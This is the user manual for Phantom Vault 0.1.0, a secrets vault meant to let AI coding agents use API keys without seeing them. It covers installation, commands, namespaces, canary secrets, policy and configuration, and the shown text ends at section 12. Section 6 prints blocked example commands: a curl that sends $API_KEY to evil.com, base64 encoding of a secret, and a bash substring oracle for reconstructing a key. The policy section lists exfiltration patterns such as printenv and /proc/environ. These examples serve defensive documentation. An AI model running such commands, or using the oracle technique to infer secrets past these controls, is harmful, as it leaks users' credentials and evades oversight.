# Phantom Vault — User Manual

**Secrets exist but are never observable.**

> The API key vault where secrets are used but never seen. Built for the age of AI agents.

**Version 0.1.0 — early software**

---

> **Honest status (read first).** Phantom Vault is early (0.1.0) and under an independent containment audit (Magnus). **Verified today:** encryption at rest (AES-256-GCM + Argon2id), `mlock` memory, the `phantom get` non-TTY read guard, the Landlock filesystem sandbox on `phantom run`, canary secrets, and the audit log. **Designed but not yet independently verified (treat as planned):** output sanitization, the network-egress jail, command pre-analysis, the tamper-evident HMAC-chained audit, and any hardware backing. Some example outputs in this manual show that designed behavior — where they do, it is the intended result under audit, not a proven guarantee. The top-line promise that "an AI can never exfiltrate a secret" is a goal we are proving, not a finished claim.

---

## Who Is This For?

If you use an AI coding assistant (Claude Code, Cursor, Windsurf) and you have API keys, this is for you. Your AI assistant can currently read your `.env` files and see every key in plain text. Phantom Vault makes it so your AI can **use** your keys without ever **seeing** them.

**No terminal experience required.** Every command in this manual shows you exactly what to type and exactly what you'll see back.

---

## Table of Contents

**[★ Command Reference](#command-reference)** — every command, grouped by who can safely run it

1. [Installation](#1-installation)
2. [Your First 5 Minutes](#2-your-first-5-minutes)
3. [Adding Secrets](#3-adding-secrets)
4. [Viewing Your Secrets](#4-viewing-your-secrets)
5. [Using Secrets with AI Agents](#5-using-secrets-with-ai-agents)
6. [Running Commands with Secrets](#6-running-commands-with-secrets)
7. [Namespaces (Multi-Project Isolation)](#7-namespaces-multi-project-isolation)
8. [Health Checks & Rotation](#8-health-checks--rotation)
9. [Audit Log](#9-audit-log)
10. [Canary Secrets (Honeypot Detection)](#10-canary-secrets-honeypot-detection)
11. [Policy & Command Rules](#11-policy--command-rules)
12. [Configuration](#12-configuration)
13. [Migrating from .env Files](#13-migrating-from-env-files)
14. [Team Setup](#14-team-setup)
15. [Troubleshooting](#15-troubleshooting)
16. [Complete Command Cheat Sheet](#16-complete-command-cheat-sheet)
17. [What Your AI Agent Sees (MCP Tools)](#17-what-your-ai-agent-sees-mcp-tools)
18. [Security Model (Plain English)](#18-security-model-plain-english)

---

## Command Reference

Every command in Phantom Vault **0.1.0**. Run `phantom <command> --help` for the full options on any of them, or `phantom help` for the top-level list.

> **Two kinds of command.** Most commands never reveal a secret's value, so they're safe for an AI agent to call. A few — `get` and `edit` — expose plaintext, so they're gated to a real interactive terminal (TTY). A scripted or agent-driven `phantom get` is **refused**.

### Agent-safe — never reveals a value

Safe for an AI agent (or any script) to call — none of these hand back a secret's plaintext.

| Command | What it does | Example |
|---------|--------------|---------|
| `add` | Add a secret. The value is entered hidden, or pulled from an existing environment variable. | `phantom add API_KEY`<br>`phantom add DB_URL --from-env MY_VAR` |
| `list` | List all secret names. Never shows values. | `phantom list` |
| `show` | Show a masked secret — the last 4 characters only. | `phantom show API_KEY --masked` |
| `run` | Run a command with secrets injected as environment variables for that one process. | `phantom run -s API_KEY -- curl https://api.example.com` |
| `rotate` | Rotate a secret — replace its value with a new one (prompted, hidden). | `phantom rotate API_KEY` |
| `import` | Import secrets from a `.env` file. | `phantom import .env` |
| `canary` | Manage canary (honeypot) secrets — `create`, `list`, `delete`. | `phantom canary create BACKUP_AWS_KEY --pattern aws-access-key` |
| `audit` | View the audit log (defaults to the last 20 entries). | `phantom audit --last 20` |
| `health` | Check vault health status. | `phantom health` |

### Human-only — reveals / allows plaintext (needs a TTY)

These expose secret material or require a person at the keyboard. They need an interactive terminal and are never available to an AI agent.

| Command | What it does | Example |
|---------|--------------|---------|
| `get` | Print a secret's full value. Requires authentication and a real terminal — a piped/scripted/agent call is refused. | `phantom get API_KEY` |
| `edit` | Open the whole vault in `$EDITOR` as an encrypted notepad (see below). Exposes every value in plaintext, so it's human-only. | `phantom edit` |
| `passwd` | Change the master password. Re-encrypts the entire vault with the new key. | `phantom passwd` |
| `init` | Initialize a new vault. Add `--biometric` for Touch ID unlock on macOS. | `phantom init`<br>`phantom init --biometric` |

### Setup & management — configuration

Administrative commands. They don't reveal values, but they change how the vault behaves.

| Command | What it does | Example |
|---------|--------------|---------|
| `biometric` | Manage biometric (Touch ID) unlock — `status`, `enable`, `disable`. | `phantom biometric enable` |
| `namespace` | Manage namespaces for secret isolation — `list`, `create`, `use`, `delete`. | `phantom namespace use work` |
| `remove` | Remove a secret from the vault. | `phantom remove API_KEY` |
| `policy` | Manage security policies — `show`, `set`, `reset`. | `phantom policy show` |
| `guardrail` | Set monthly spending caps on credentials — `set`, `list`, `remove`, `status`. | `phantom guardrail set openai-key --cap 50 --provider openai` |
| `mcp` | Manage the MCP server for Claude Code — `install`, `uninstall`, `status`. | `phantom mcp install` |
| `update` | Update phantom to the latest version from GitHub releases. | `phantom update` |
| `help` | Print help for phantom, or for any single command. | `phantom help`<br>`phantom add --help` |

### `phantom edit` — the encrypted notepad

`phantom edit` opens your **entire vault** in `$EDITOR` as a plain `KEY=VALUE` list — one secret per line — so you can add, change, or delete many secrets in a single pass. When you save and close the editor, Phantom re-encrypts the whole vault. Remove a line to delete that secret; lines starting with `#` are comments.

```
ryan@macbook ~ % phantom edit

  # opens $EDITOR with every secret in KEY=VALUE form:
  OPENAI_API_KEY=sk-...
  STRIPE_SECRET_KEY=sk_live_...
  DATABASE_URL=postgres://...

  # edit a line to update it, delete a line to remove that secret,
  # add a line to create one, then save to re-encrypt the vault.

ryan@macbook ~ % EDITOR=nano phantom edit    # use a specific editor
```

> **Human-only.** Because it lays every secret out in plaintext inside your editor, `phantom edit` requires an interactive terminal and is never exposed to an AI agent — the same guarantee as `phantom get`.

---

## 1. Installation

### How to Open Your Terminal

**On Mac:** Press `Cmd + Space`, type "Terminal", press Enter.
**On Linux:** Press `Ctrl + Alt + T` or find "Terminal" in your applications menu.

You'll see something like this — a blinking cursor waiting for you to type:

```
ryan@macbook ~ %
```

That `%` (or `$` on Linux) is called the **prompt**. It means the terminal is ready for your input. You type commands after it.

---

### Install Phantom Vault (One Command)

Copy this, paste it into your terminal, press Enter:

```
ryan@macbook ~ % curl -fsSL https://phantomvault.riscent.com/install | bash

  ⬇ Phantom Vault Installer

  Detecting system...
  ✓ macOS 15.3 (Apple Silicon M4)

  Downloading phantom + vault-mcp (0.1.0) for aarch64-apple-darwin...
  ✓ Downloaded (4.2 MB)

  Installing to /usr/local/bin/phantom...
  ✓ Installed

  Verifying...
  ✓ phantom 0.1.0

  🔐 Phantom Vault is ready.
  Run 'phantom init' to create your vault.
```

That's it. One command. It detects your operating system, downloads the right version, and installs it. Works on Mac (Intel and Apple Silicon) and Linux.

**On Linux it looks like this:**

```
ryan@linux ~ $ curl -fsSL https://phantomvault.riscent.com/install | bash

  ⬇ Phantom Vault Installer

  Detecting system...
  ✓ Linux x86_64 (Ubuntu 24.04)

  Downloading phantom + vault-mcp (0.1.0) for x86_64-unknown-linux-gnu...
  ✓ Downloaded (4.8 MB)

  Installing to /usr/local/bin/phantom...
  (requires sudo — enter your password)
  [sudo] password for ryan: ********
  ✓ Installed

  🔐 Phantom Vault is ready.
  Run 'phantom init' to create your vault.
```

---

### Verify It Worked

```
ryan@macbook ~ % phantom --version
phantom 0.1.0
```

If you see the version number, you're good. If you see `command not found`, see [Troubleshooting](#15-troubleshooting).

---

### Other Install Methods (If You Prefer)

Most people should use the one-liner above. These are alternatives for developers who prefer a specific method:

**Homebrew (Mac):**
```
ryan@macbook ~ % brew install phantomvault/tap/phantom-vault
```

**Cargo (if you have Rust):**
```
ryan@macbook ~ % cargo build --release -p phantom-cli -p vault-mcp
```

**Build from source:**
```
ryan@macbook ~ % git clone https://github.com/phantomvault/phantom-vault.git
ryan@macbook ~ % cd phantom-vault && cargo build --release
ryan@macbook phantom-vault % sudo cp target/release/phantom /usr/local/bin/
```

---

## 2. Your First 5 Minutes

This section walks you through the complete setup. Follow every step.

### Step 1: Create Your Vault

```
ryan@macbook ~ % phantom init

  🔐 Phantom Vault — Initialization

  Detecting hardware security...
  ✓ Apple Secure Enclave detected (M4)
  ✓ Touch ID available

  Creating vault at ~/.phantom-vault
  ✓ Vault created with hardware-backed encryption
  ✓ Config written to ~/.phantom/config.toml
  ✓ Audit log initialized at ~/.phantom/audit.db
  ✓ Default policy written to ~/.phantom/policy.yaml

  Your vault is ready. Master key is stored in the Secure Enclave.
  No password exists anywhere. Unlock with Touch ID.

  Next steps:
    phantom add MY_FIRST_SECRET     Add a secret
    phantom mcp install             Connect to Claude Code
    phantom --help                  See all commands
```

> **What just happened?** Phantom created an encrypted database on your computer. On Apple Silicon Macs, the encryption key lives inside the Secure Enclave chip — it physically cannot be extracted. On other systems, you'll be asked to create a password.

**If you DON'T have Touch ID (Intel Mac or Linux):**

```
ryan@macbook ~ % phantom init

  🔐 Phantom Vault — Initialization

  Detecting hardware security...
  ⚠ No Secure Enclave detected
  ⚠ No TPM 2.0 detected
  Using software encryption (Argon2id)

  Create a master password for your vault.
  This password protects all your secrets.
  Choose something strong — you'll need it to unlock the vault.

  Master password: ••••••••••••••••
  Confirm password: ••••••••••••••••

  ✓ Vault created with Argon2id key derivation
    (256MB memory cost — brute force is not viable)
  ✓ Config written to ~/.phantom/config.toml
  ✓ Audit log initialized
  ✓ Default policy written

  Your vault is ready.
```

> **Enabling Touch ID.** Pass `--biometric` to `phantom init` (macOS only) to enable Touch ID unlock at creation, or run `phantom biometric enable` later. Those are the only ways to turn it on — there is no `--no-biometric` flag; password-only is simply the default when no Secure Enclave/biometric is available.

---

### Step 2: Add a Secret

Let's store your first API key. Type this command — Phantom will ask you to enter the value:

```
ryan@macbook ~ % phantom add STRIPE_SECRET_KEY

  Enter secret value: ••••••••••••••••••••••••••••
  (input is hidden — nothing will appear as you type)

  ✓ Secret STRIPE_SECRET_KEY stored
    Namespace:  default
    Expires:    never
```

> **Why doesn't it show what I'm typing?** For security. The value is captured directly from your keyboard input and goes straight into the encrypted vault. It never appears on screen, in your terminal history, or in any log.

---

### Step 3: Verify It's There

```
ryan@macbook ~ % phantom list

  SECRETS IN NAMESPACE: default

  NAME                  CREATED      EXPIRES   ACCESSED
  ──────────────────────────────────────────────────────
  STRIPE_SECRET_KEY     2026-02-27   never     0 times
```

---

### Step 4: Connect to Claude Code

```
ryan@macbook ~ % phantom mcp install

  Installing MCP server configuration...

  ✓ Added phantom-vault to ~/.claude/settings.json
  ✓ MCP server configured (stdio transport)

  ⚠ Restart Claude Code to activate the connection.

  After restart, Claude will have access to:
    vault_list    — See secret names (never values)
    vault_run     — Run commands with secrets injected
    vault_health  — Check secret expiration status
    vault_masked  — See last 4 characters only
    vault_exists  — Check if a secret exists
    vault_rotate  — Request secret rotation (requires your approval)
```

**Restart Claude Code** (close and reopen it). That's it — you're connected.

---

### Step 5: Test It

Open Claude Code and type:

```
You: "What secrets do I have available?"

Claude: I can see you have the following secrets available:

  • STRIPE_SECRET_KEY (created 2026-02-27)

Would you like me to use any of these for a task?
```

Claude can see the **name** but not the **value**. That's the whole point.

---

## 3. Adding Secrets

### Basic Add (Interactive Prompt)

```
ryan@macbook ~ % phantom add DATABASE_URL

  Enter secret value: ••••••••••••••••••••••••••••••••••••••••

  ✓ Secret DATABASE_URL stored
    Namespace:  default
```

### Add with Options

```
ryan@macbook ~ % phantom add CLERK_SECRET_KEY --namespace ib365 --expires 90d

  Enter secret value: ••••••••••••••••••••••••••••

  ✓ Secret CLERK_SECRET_KEY stored
    Namespace:   ib365
    Expires:     2026-05-28 (90 days)
```

### Every Flag Explained

```
ryan@macbook ~ % phantom add --help

Add a secret to the vault

Usage: phantom add [OPTIONS] <NAME>

Arguments:
  <NAME>  Name of the secret

Options:
      --from-env <FROM_ENV>    Import from environment variable
      --expires <EXPIRES>      Set expiration (e.g., 7d, 30d, 90d)
      --namespace <NAMESPACE>  Namespace for this secret
  -h, --help                   Print help
```

- `--from-env <VAR>` — read the value from an existing environment variable instead of prompting.
- `--expires <duration>` — when the secret should expire (e.g. `7d`, `30d`, `90d`). Default: never.
- `--namespace <name>` — which namespace to store it in. Default: your configured default namespace.

### Add from an Environment Variable

If a key is already in an environment variable, import it without typing it:

```
ryan@macbook ~ % export TEMP_KEY="sk_live_abc123xyz"
ryan@macbook ~ % phantom add STRIPE_KEY --from-env TEMP_KEY

  ✓ Secret STRIPE_KEY stored (read from $TEMP_KEY)

ryan@macbook ~ % unset TEMP_KEY
```

### What NOT to Do

```
# ❌ NEVER DO THIS — the value is visible in your terminal history
ryan@macbook ~ % phantom add STRIPE_KEY sk_live_abc123xyz
# There is no way to pass a value as an argument. Secret values are never
# passed on the command line — use the hidden interactive prompt or --from-env.

# ❌ NEVER DO THIS — visible in process listings and logs
ryan@macbook ~ % STRIPE_KEY=sk_live_abc123 phantom add STRIPE_KEY --from-env STRIPE_KEY
# Piping a live secret through a throwaway shell variable is fine (see above),
# but never inline it on the same line as the command.
```

---

## 4. Viewing Your Secrets

### List All Secrets

```
ryan@macbook ~ % phantom list

  SECRETS IN NAMESPACE: default

  NAME                  CREATED      EXPIRES      ACCESSED
  ──────────────────────────────────────────────────────────
  STRIPE_SECRET_KEY     2026-02-27   never        3 times
  DATABASE_URL          2026-02-27   2026-05-28   12 times
  RAILWAY_TOKEN         2026-02-27   never        1 time
  CLERK_SECRET_KEY      2026-02-27   2026-05-28   7 times
  ELEVENLABS_API_KEY    2026-02-27   never        0 times
```

`phantom list` shows secret **names only** — never values. It takes a single flag, `-n`/`--namespace`, to list a different namespace.

### List in a Specific Namespace

```
ryan@macbook ~ % phantom list --namespace ib365

  SECRETS IN NAMESPACE: ib365

  NAME                  CREATED      EXPIRES      ACCESSED
  ──────────────────────────────────────────────────────────
  CLERK_SECRET_KEY      2026-02-27   2026-05-28   7 times
  NEON_DB_URL           2026-02-27   never        4 times
```

### Show Details for One Secret

```
ryan@macbook ~ % phantom show STRIPE_SECRET_KEY --masked

  SECRET: STRIPE_SECRET_KEY

  Namespace:    default
  Created:      2026-02-27 14:32:01 UTC
  Expires:      never
  Accessed:     3 times
  Last access:  2026-02-27 16:45:22 UTC
  Value:        ••••••••••••rXYZ  (last 4 characters only)
```

> **Why only the last 4?** So you can confirm it's the right key without exposing the full value. This is the same approach Stripe's dashboard uses. Pass `--masked` to reveal those last 4 characters.

### Get the Full Value (Human Only — Requires Biometric)

```
ryan@macbook ~ % phantom get STRIPE_SECRET_KEY

  ⚠ FULL SECRET RETRIEVAL — This shows the complete value.

  [Touch ID prompt appears on screen]
  🔐 Authenticate with Touch ID...

  ✓ Authenticated

  STRIPE_SECRET_KEY = sk_live_51abc...xyz789

  ⚠ This value was displayed in your terminal.
    Clear your screen with: Cmd+K (Mac) or clear (Linux)
```

**If called through a pipe (blocked):**

```
ryan@macbook ~ % phantom get STRIPE_SECRET_KEY | cat

  ✗ BLOCKED: phantom get requires a real terminal (TTY).
    It cannot be called through a pipe, script, or MCP server.
    This prevents AI agents from reading secret values.
```

**Every flag for `phantom get`:**

```
ryan@macbook ~ % phantom get --help

Get a secret value (requires authentication)

Usage: phantom get <NAME>

Arguments:
  <NAME>  Name of the secret

Options:
  -h, --help  Print help

SECURITY:
  This command REQUIRES:
  ✓ Authentication (Touch ID / biometric, or master password)
  ✓ A real terminal session (isatty check)

  This command CANNOT be called by:
  ✗ An AI agent (blocked at the MCP level)
  ✗ A piped command (blocked by TTY check)
  ✗ A subprocess or script (blocked by TTY check)
```

---

## 5. Using Secrets with AI Agents

### Connect Phantom Vault to Claude Code

```
ryan@macbook ~ % phantom mcp install

  Installing MCP server configuration...

  ✓ Added phantom-vault to ~/.claude/settings.json
  ✓ MCP server configured (stdio transport)

  ⚠ Restart Claude Code to activate.
```

**Restart Claude Code after running this command.**

### Check MCP Status

```
ryan@macbook ~ % phantom mcp status

  MCP SERVER STATUS

  Configuration:  ✓ Installed in ~/.claude/settings.json
  Server binary:  ✓ /usr/local/bin/phantom
  Vault:          ✓ ~/.phantom-vault (encrypted, 5 secrets)
  Last connected: 2026-02-27 16:45:22 UTC
```

### Start MCP Server Manually (You Usually Don't Need This)

Claude Code starts the MCP server automatically. But if you need to test:

```
ryan@macbook ~ % vault-mcp

  🔐 Phantom Vault MCP Server
  Transport: stdio (JSON-RPC)
  Namespace: default
  Secrets:   5 available
  Tools:     vault_list, vault_exists, vault_masked, vault_run, vault_health, vault_rotate
  Status:    waiting for connection...
```

### Remove MCP Integration

```
ryan@macbook ~ % phantom mcp uninstall

  ✓ Removed phantom-vault from ~/.claude/settings.json
  ⚠ Restart Claude Code to apply.
```

### What Claude Code Can Do vs. What It Can't

```
┌──────────────────────────────────────────────────────────────────────┐
│                    WHAT CLAUDE CAN DO                                │
├──────────────────────────────────────────────────────────────────────┤
│  ✓ vault_list    — See names and expiration dates                   │
│  ✓ vault_exists  — Check if a specific secret exists                │
│  ✓ vault_masked  — See last 4 characters: ••••••rXYZ               │
│  ✓ vault_run     — Execute a command with secrets injected          │
│  ✓ vault_health  — Check which secrets are expiring                 │
│  ✓ vault_rotate  — Request rotation (you still approve it)          │
├──────────────────────────────────────────────────────────────────────┤
│                    WHAT CLAUDE CANNOT DO                             │
├──────────────────────────────────────────────────────────────────────┤
│  ✗ vault_get     — Does not exist. Cannot retrieve full values.     │
│  ✗ vault_export  — Does not exist. Cannot bulk extract secrets.     │
│  ✗ vault_dump    — Does not exist. Cannot dump the vault.           │
│  ✗ vault_decrypt — Does not exist. Cannot decrypt anything.         │
│                                                                      │
│  These tools are not hidden or restricted. They do not exist in     │
│  the binary. You cannot call what does not exist.                   │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 6. Running Commands with Secrets

### Basic Usage

This runs a command with your secret injected as an environment variable. Name the secret with `-s NAME`, then put the command after `--`:

```
ryan@macbook ~ % phantom run -s STRIPE_SECRET_KEY -- stripe customers list

  ✓ Command analyzed: SAFE
  ✓ Secret injected: STRIPE_SECRET_KEY
  ✓ Executing: stripe customers list

  {
    "data": [
      {"id": "cus_abc123", "email": "customer@example.com"},
      {"id": "cus_def456", "email": "other@example.com"}
    ]
  }

  ✓ Secret memory zeroed
```

The subprocess runs under a Landlock filesystem sandbox. Automatic output scanning/redaction is in the codebase but not yet independently verified — treat it as planned.

### Multiple Secrets

Pass `-s` once per secret:

```
ryan@macbook ~ % phantom run -s RAILWAY_TOKEN -s DATABASE_URL -- railway deploy

  ✓ Command analyzed: SAFE
  ✓ Secrets injected: RAILWAY_TOKEN, DATABASE_URL
  ✓ Executing: railway deploy

  Deploying service main...
  Build completed in 42s
  Deploy live at https://myapp.up.railway.app

  ✓ Secret memory zeroed
```

### Inject Under a Different Variable Name

Use `-s NAME=ENV_VAR` to expose a secret to the subprocess under a different environment-variable name:

```
ryan@macbook ~ % phantom run -s MY_KEY=CUSTOM_VAR -- env

  ✓ Secret MY_KEY injected as CUSTOM_VAR
  ✓ Executing: env
```

### When a Command Gets BLOCKED

The command analyzer inspects each command before it runs and refuses ones that would leak a secret:

```
ryan@macbook ~ % phantom run -s API_KEY -- echo $API_KEY

  ✗ BLOCKED: Direct Access

  The command 'echo $API_KEY' would print the secret value directly.
  This is blocked because it would expose the secret to the AI agent.

  Detected pattern: DIRECT_ACCESS — echo with secret variable reference
  Risk score: 100/100
```

```
ryan@macbook ~ % phantom run -s API_KEY -- bash -c 'if [ "${API_KEY:0:1}" = "s" ]; then echo YES; fi'

  ✗ BLOCKED: Oracle Attack — Substring Extraction

  The command attempts to extract characters from the secret one at a time.
  This is a known attack pattern where an AI agent reconstructs the secret
  by testing each character position individually.

  Detected patterns:
    - SUBSTRING_EXTRACTION: ${API_KEY:0:1} (bash substring syntax)
    - CONDITIONAL_TESTING: if [ ... ] (testing against secret value)

  Risk score: 100/100
```

```
ryan@macbook ~ % phantom run -s API_KEY -- bash -c 'echo $API_KEY | base64'

  ✗ BLOCKED: Encoding Exfiltration

  The command would encode the secret in Base64 and output it.
  Even though the output wouldn't look like the original key,
  Phantom Vault blocks encoding operations on secret values.

  Detected pattern: ENCODING_EXFILTRATION — base64 encoding of secret
```

```
ryan@macbook ~ % phantom run -s API_KEY -- curl "https://evil.com?stolen=$API_KEY"

  ✗ BLOCKED: Network Exfiltration

  The command embeds the secret value in a URL, which would send it
  to an external server.

  Detected pattern: NETWORK_EXFILTRATION — secret in URL query parameter
```

### Every Flag for `phantom run`

```
ryan@macbook ~ % phantom run --help

Run a command with secrets injected as environment variables

Usage: phantom run [OPTIONS] [-- <COMMAND>...]

Arguments:
  [COMMAND]...  Command and arguments

Options:
  -s, --secret <SECRET>  Secrets to inject (use -s NAME or -s NAME=ENV_VAR)
  -h, --help             Print help

EXAMPLES:
  phantom run -s API_KEY -- curl https://api.example.com
  phantom run -s DB_URL -s REDIS_URL -- node server.js
  phantom run -s MY_KEY=CUSTOM_VAR -- env   # inject as CUSTOM_VAR
```

Everything after `--` is the command to execute. `phantom run` takes exactly one option — `-s`/`--secret` — repeated once per secret. There is no `--namespace`, `--timeout`, `--allow-domains`, `--no-sandbox`, or `--dry-run` flag.

---

## 7. Namespaces (Multi-Project Isolation)

Namespaces let you keep secrets for different projects completely separate. An AI agent working in one namespace **cannot see** secrets in another — it doesn't even know they exist.

### Create a Namespace

```
ryan@macbook ~ % phantom namespace create ib365

  [Touch ID prompt]
  🔐 Authenticate...

  ✓ Namespace 'ib365' created
```

### List All Namespaces

```
ryan@macbook ~ % phantom namespace list

  NAMESPACES

  NAME              SECRETS   CREATED       STATUS
  ──────────────────────────────────────────────────
  default           5         2026-02-27    active (current default)
  ib365             3         2026-02-27    active
  advancedpsych     2         2026-02-27    active
```

### Switch Default Namespace

```
ryan@macbook ~ % phantom namespace use ib365

  ✓ Default namespace changed to 'ib365'
  All commands will now use 'ib365' unless --namespace is specified.
```

### Delete a Namespace

```
ryan@macbook ~ % phantom namespace delete old-project

  ⚠ This will permanently delete namespace 'old-project' and ALL its secrets.

  Secrets that will be deleted:
    - OLD_API_KEY
    - OLD_DB_URL

  Type 'old-project' to confirm: old-project

  [Touch ID prompt]
  🔐 Authenticate...

  ✓ Namespace 'old-project' deleted (2 secrets removed)
```

---

## 8. Health Checks & Rotation

### Check Vault Health

```
ryan@macbook ~ % phantom health

  🔐 PHANTOM VAULT HEALTH CHECK

  Vault:      ✓ Encrypted, integrity verified
  Audit log:  ✓ 847 entries, HMAC chain valid
  Policy:     ✓ Signed, 12 rules loaded, not tampered

  SECRETS STATUS:

  ✓ STRIPE_SECRET_KEY     — healthy (45 days old)
  ✓ RAILWAY_TOKEN         — healthy (30 days old)
  ⚠ DATABASE_URL          — expires in 12 days (rotate soon)
  ⚠ CLERK_SECRET_KEY      — 95 days old (rotation recommended)
  ✓ ELEVENLABS_API_KEY    — healthy (10 days old)

  CANARIES:

  ✓ 3 canary secrets active
  ✓ 0 triggered (no exfiltration attempts detected)

  SUMMARY: 2 warnings, 0 critical issues
```

### Rotate a Secret

`phantom rotate` replaces a secret's value with a new one. It prompts you for the new value (hidden, like `phantom add`), then overwrites the old value and zeroes it from memory. Phantom does not contact the vendor's API — generate the new key at the provider first, then rotate it in:

```
ryan@macbook ~ % phantom rotate ELEVENLABS_API_KEY

  [Touch ID prompt]
  🔐 Authenticate...

  Rotating ELEVENLABS_API_KEY...
  (generate a fresh key at your provider first, then paste it below)

  Enter new value: ••••••••••••••••••••••••••••

  ✓ New value stored
  ✓ Old value overwritten and zeroed from memory
  ✓ Audit log updated
```

---

## 9. Audit Log

Every action in Phantom Vault is logged in a tamper-evident chain. Each entry's integrity hash includes the previous entry — if anyone modifies or deletes a log entry, the chain breaks.

### View Recent Activity

`phantom audit` prints the audit log, most recent last. By default it shows the last 20 entries; use `--last N` to change how many:

```
ryan@macbook ~ % phantom audit

  RECENT AUDIT ENTRIES (last 20)

  TIMESTAMP             TOOL          KEY                  RESULT
  ────────────────────────────────────────────────────────────────────
  2026-02-27 16:45:22   vault_run     STRIPE_SECRET_KEY    ✓ success
  2026-02-27 16:44:01   vault_list    —                    ✓ success
  2026-02-27 16:43:50   vault_run     DATABASE_URL         ✗ blocked (oracle)
  2026-02-27 16:40:11   vault_masked  STRIPE_SECRET_KEY    ✓ success
  2026-02-27 16:38:00   vault_health  —                    ✓ success
  ...
```

### Show More (or Fewer) Entries

```
ryan@macbook ~ % phantom audit --last 50
  (shows the last 50 entries)
```

`--last N` is the only flag `phantom audit` takes. It does not have `tail`, `search`, `verify`, or `export` subcommands — pipe the output to standard tools (`grep`, `less`) if you want to filter or save it:

```
ryan@macbook ~ % phantom audit --last 200 | grep STRIPE_SECRET_KEY
ryan@macbook ~ % phantom audit --last 500 > audit_backup.txt
```

> **Tamper-evidence.** A tamper-evident HMAC-chained audit log is in the codebase but not yet independently verified — treat the tamper-evidence as planned. `phantom health` reports the chain's status as part of its check.

---

## 10. Canary Secrets (Honeypot Detection)

Canary secrets are fake API keys that look real. They're planted in your vault alongside your actual secrets. If anything — an AI agent, an attacker, a compromised tool — tries to use a canary secret, you get an immediate alert.

The key feature: canary secrets are **indistinguishable** from real secrets in the vault_list output. An attacker cannot tell which secrets are real and which are traps.

### Create a Canary

Give the canary a name, and optionally a `--pattern` so its fake value looks like a real key of that type (e.g. `aws-access-key`, `stripe-key`):

```
ryan@macbook ~ % phantom canary create BACKUP_AWS_ACCESS_KEY --pattern aws-access-key

  [Touch ID prompt]
  🔐 Authenticate...

  ✓ Canary created: BACKUP_AWS_ACCESS_KEY
    Value looks like: AKIA••••••••••••7X2F (realistic AWS key format)
    Trigger: alert on any access via vault_run

  This canary is now indistinguishable from a real secret in vault_list.
```

### List Canaries

```
ryan@macbook ~ % phantom canary list

  CANARY SECRETS

  NAME                      NAMESPACE    FORMAT       STATUS      TRIGGERED
  ──────────────────────────────────────────────────────────────────────────
  BACKUP_AWS_ACCESS_KEY     default      AWS (AKIA)   active      never
  OLD_STRIPE_TEST_KEY       ib365        Stripe       active      never
  LEGACY_GITHUB_TOKEN       default      GitHub       active      never
```

### Delete a Canary

```
ryan@macbook ~ % phantom canary delete BACKUP_AWS_ACCESS_KEY

  ✓ Canary 'BACKUP_AWS_ACCESS_KEY' deleted
```

> **Where triggers show up.** `phantom canary` has three subcommands only — `create`, `list`, and `delete`. When a canary is touched, the event lands in the audit log (`phantom audit`) and is reflected in `phantom health`.

---

## 11. Policy & Command Rules

The policy controls which commands are allowed and which are blocked by the command pre-analysis engine.

### View Current Policy

```
ryan@macbook ~ % phantom policy show

  COMMAND ANALYSIS POLICY

  Status: ✓ Signed (HMAC verified)

  ALLOWED DOMAINS:
    api.stripe.com
    api.clerk.com
    railway.app
    api.vercel.com
    neon.tech

  BLOCKED PATTERNS:
    7 categories active:
    - Substring extraction (${VAR:N:M}, cut, awk substr...)
    - Conditional testing (if/test against secret values)
    - Encoding exfiltration (base64, xxd, od)
    - Network exfiltration (secrets in URLs)
    - Direct access (echo $VAR, printenv, /proc/environ)
    - Write to file (redirect secret to disk)
    - Timing oracle (sleep in conditionals)

  PER-SECRET RULES:
    DATABASE_URL:    only allowed with psql, railway
    STRIPE_KEY:      only allowed with stripe, curl to api.stripe.com
```

### Change the Policy

Policy changes are made by loading a policy file, not with per-rule commands. Write your rules to a file, then apply it with `phantom policy set <file>`:

```
ryan@macbook ~ % phantom policy set my-policy.toml

  ✓ Security policy updated from 'my-policy.toml'
  ✓ Policy re-signed
```

`phantom policy` has exactly three subcommands — `show`, `set`, and `reset`. There are no `allow-domain`, `block-pattern`, or `verify` subcommands; edit the policy file and re-apply it with `policy set`, or start over with `policy reset`.

### Reset to Defaults

```
ryan@macbook ~ % phantom policy reset

  ⚠ This will reset your policy to secure defaults.
  All custom allowed domains and patterns will be removed.

  Proceed? [y/N]: y

  [Touch ID prompt]
  🔐 Authenticate...

  ✓ Policy reset to defaults
  ✓ Policy re-signed
```

---

## 12. Configuration

All settings live in `~/.phantom/config.toml`. You can edit this file directly with any text editor, or use CLI commands.

### View Current Config

```
ryan@macbook ~ % cat ~/.phantom/config.toml

[server]
idle_timeout_minutes = 15       # Auto-lock vault after 15 min inactive
max_runs_per_minute = 10        # Rate limit for vault_run
require_biometric = true        # Require Touch ID / biometric

[namespaces]
default = "personal"            # Default namespace for new secrets
allowed = ["personal", "ib365", "advancedpsych"]

[rotation]
warn_at_days = 60               # Warning when secret is this old
critical_at_days = 90           # Critical warning threshold

[canary]
auto_create = true              # Auto-plant canaries in new namespaces

[sandbox]
default_timeout_seconds = 30    # Max command execution time
network_filtering = true        # Enable per-process network rules
```

### What Each Setting Does

| Setting | What It Does | Default |
|---------|-------------|---------|
| `idle_timeout_minutes` | Lock the vault after this many minutes of no activity | 15 |
| `max_runs_per_minute` | Maximum vault_run calls per minute (prevents rapid probing) | 10 |
| `require_biometric` | Whether Touch ID / biometric is required | true |
| `default` namespace | Which namespace new secrets go into | "personal" |
| `allowed` namespaces | Which namespaces can be created and accessed | (list) |
| `warn_at_days` | Days before health check warns about secret age | 60 |
| `critical_at_days` | Days before critical warning about secret age | 90 |
| `auto_create` canaries | Automatically plant canary secrets in new namespaces | true |
| `default_timeout_seconds` | Max time for vault_run commands | 30 |
| `network_filtering` | Enable per-process network sandbox | true |

### File Locations

```
~/.phantom/
├── vault.db        ← Encrypted secret storage (SQLite)
├── config.toml     ← Configuration (the file shown above)
├── audit.db        ← HMAC-chained audit log
├── policy.yaml     ← Command analysis policy (HMAC-signed)
└── canaries/       ← Canary secret configuration
```

### Environment Variables

You can override settings with environment variables:

| Variable | What It Does |
|----------|-------------|
| `PHANTOM_HOME` | Override config directory (default: `~/.phantom`) |
| `PHANTOM_NAMESPACE` | Override default namespace for current session |
| `PHANTOM_LOG_LEVEL` | Logging verbosity: error, warn, info, debug, trace |
| `PHANTOM_NO_COLOR` | Set to `1` to disable colored terminal output |

```
ryan@macbook ~ % PHANTOM_NAMESPACE=ib365 phantom list

  SECRETS IN NAMESPACE: ib365
  (lists ib365 secrets without needing --namespace flag)
```

